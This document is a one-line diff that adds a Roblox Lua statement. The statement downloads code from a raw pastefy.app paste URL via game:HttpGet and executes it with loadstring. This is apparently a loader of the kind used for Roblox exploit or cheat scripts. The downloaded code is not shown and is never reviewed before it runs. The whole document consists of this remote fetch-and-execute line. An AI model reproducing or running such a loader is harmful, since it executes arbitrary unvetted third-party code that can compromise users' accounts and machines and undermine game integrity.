@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://pastefy.app/imir20EP/raw'),true))()
